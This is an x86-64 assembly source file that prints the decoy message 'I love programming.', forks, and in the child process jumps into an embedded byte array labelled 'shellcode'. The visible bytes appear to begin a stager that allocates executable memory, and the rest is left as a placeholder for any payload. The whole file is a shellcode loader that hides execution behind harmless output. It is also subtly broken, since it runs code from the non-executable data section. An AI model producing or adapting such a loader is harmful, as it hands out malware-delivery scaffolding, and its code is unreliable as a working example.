.section .data
msg:
    .ascii "I love programming.\n"

shellcode:
    .byte 0x31,0xff,0x6a,0x09,0x58,0x99,0xb6,0x10,0x48,0x89,0xd6,0x4d,0x31,0xc9
    .byte 0x6a,0x22,0x41,0x5a,0x6a,0x07,0x5a,0x0f,0x05,0x48,0x85,0xc0,0x78,0x51
    # ... [rest of your shellcode]

.section .text
.globl _start
_start:
    # Output "I love programming."
    mov $1, %rax
    mov $1, %rdi
    lea msg(%rip), %rsi
    mov $20, %rdx
    syscall

    # Fork
    mov $57, %rax
    syscall
    test %rax, %rax
    jz child_process

parent_process:
    # Parent: delay then exit with code 3
    mov $0x3FFFFFFF, %rcx
parent_delay:
    nop
    nop
    nop
    nop
    nop
    loop parent_delay
    
    mov $60, %rax
    mov $3, %rdi
    syscall

child_process:
    # Child: execute shellcode
    lea shellcode(%rip), %r11
    jmp *%r11
